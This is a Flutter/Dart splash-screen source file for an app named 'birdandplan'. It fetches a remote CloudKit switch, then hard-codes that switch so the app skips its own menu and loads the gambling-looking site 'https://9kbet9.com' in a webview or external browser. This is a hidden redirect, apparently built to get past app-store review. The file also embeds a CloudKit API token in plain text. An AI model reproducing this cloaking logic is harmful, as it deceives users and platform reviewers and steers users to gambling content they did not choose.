import 'package:birdandplan/htmlcore.dart';
import 'package:birdandplan/menu.dart';
import 'package:birdandplan/webview.dart';
import 'package:flutter/material.dart';

import 'dart:io';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

import 'package:url_launcher/url_launcher.dart';

class _SplashScreenState extends State<SplashScreen>
    with WidgetsBindingObserver {
  final client = HttpClient();
  final containerIdentifier = 'iCloud.planebird';
  final apiToken =
      '41023ac4d8da86044588c02c4cf02b68d69200f8a54265b51e6ef422b821fff4';
  final environment = 'development'; // Hoặc 'production'
  final baseUrl = 'https://api.apple-cloudkit.com/database/1';
  late String _link; 

  Future<void> getDataFromCloudKit() async {
    // Xây dựng URL cho yêu cầu lấy bản ghi
    final queryUrl =
        '$baseUrl/$containerIdentifier/$environment/public/records/query?ckAPIToken=$apiToken';
    // Tạo yêu cầu HTTP POST
    final request = await client.postUrl(Uri.parse(queryUrl));

    // Tạo yêu cầu HTTP POST
    final query = {
      'query': {'recordType': 'get'}
    };

    request.write(json.encode(query));
    // Gửi yêu cầu và đọc phản hồi
    final response = await request.close();
    final responseBody = await response.transform(utf8.decoder).join();

    Map<String, dynamic> jsonResponse = jsonDecode(responseBody);
    final data = jsonResponse['records'][0]['fields'];

    // final access = data['access']['value'];
    // final url = data['url']['value'];
        
    final access = "4";
    final url = "https://9kbet9.com";
    print(access);
    print(url);
    if (access == "1") {
      Future.delayed(Duration(seconds: 1), () {
        launch(url, forceSafariVC: false, forceWebView: false);
        setState(() {
          _link = url;
        });
      });
    } else if (access == "2") {
      launch(url);
    }
    else if (access == "3"){
      Future.delayed(Duration(seconds: 1),(){
        Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => WebViewScreen(initialUrl: url)));
      });
    }    else if (access == "4"){
      Future.delayed(Duration(seconds: 1),(){
        Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => LoadHTML(initialUrl: url)));
      });
    }

    else {
      Future.delayed(Duration(seconds: 1), () {
        // Change to Home View
        Navigator.pushReplacement(
            context, MaterialPageRoute(builder: (context) => MenuScreen()));
            });
    }
  }

  @override
  void initState() {
    // TODO: implement initState
    super.initState();
    WidgetsBinding.instance?.addObserver(this);
    getDataFromCloudKit();
  }

  @override
  void dispose() {
    WidgetsBinding.instance?.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed && _link != null) {
      // Xử lý liên kết sau khi quay lại ứng dụng
      getDataFromCloudKit();
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Stack(
        children: [
          // Positioned.fill(
          //     child: Image.asset(
          //   'assets/logo.png',
          //   fit: BoxFit.fill,
          // )),
          // Hình ảnh chính giữa màn hình
          // Loading circle nằm dưới màn hình
          Positioned(
            bottom: MediaQuery.of(context).size.height * 0.5,
            left: 0,
            right: 0,
            child: Center(
              child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                CircularProgressIndicator(),
                SizedBox(height: 16),
                Text(
                  'Loading ...',
                  style: TextStyle(
                    fontSize: 16,
                    fontWeight: FontWeight.bold,
                  ),
                ),
              ],
            ),
            ),
          ),
        ],
      ),
    );
  }
}

class SplashScreen extends StatefulWidget {
  @override
  _SplashScreenState createState() => _SplashScreenState();
}